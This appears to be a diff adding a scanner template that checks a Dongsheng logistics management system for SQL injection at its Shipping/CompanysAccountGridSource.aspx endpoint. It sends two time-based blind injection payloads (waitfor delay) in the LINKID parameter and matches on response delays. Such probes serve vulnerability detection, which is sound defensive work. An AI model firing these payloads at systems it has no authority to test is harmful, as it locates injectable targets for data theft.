@@ -1,0 +1,21 @@
+id: dongsheng-logistics-software-companysaccountgridsource-ashx-sqli
+info:
+  name: 东胜物流软件 CompanysAccountGridSource.aspx SQL注入
+  author: 0dayPoc
+  severity: high
+  description: 青岛东胜伟业软件有限公司开发的东胜物流信息管理系统中，Shipping/CompanysAccountGridSource.aspx接口存在SQL注入缺陷。攻击者可利用此漏洞构造恶意SQL查询，获取未授权数据访问权限，包括管理员凭证及用户隐私信息。在高权限场景下，该注入点可能被用于执行系统命令或植入后门，进而导致服务器控制权丧失。
+  tags: 东胜物流软件
+http:
+- raw:
+  - |
+    GET /Shipping/CompanysAccountGridSource.aspx?read=1&LINKID=1%27waitfor%20delay%270%3A0%3A5 HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /Shipping/CompanysAccountGridSource.aspx?read=1&LINKID=1%27waitfor%20delay%270%3A0%3A8 HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
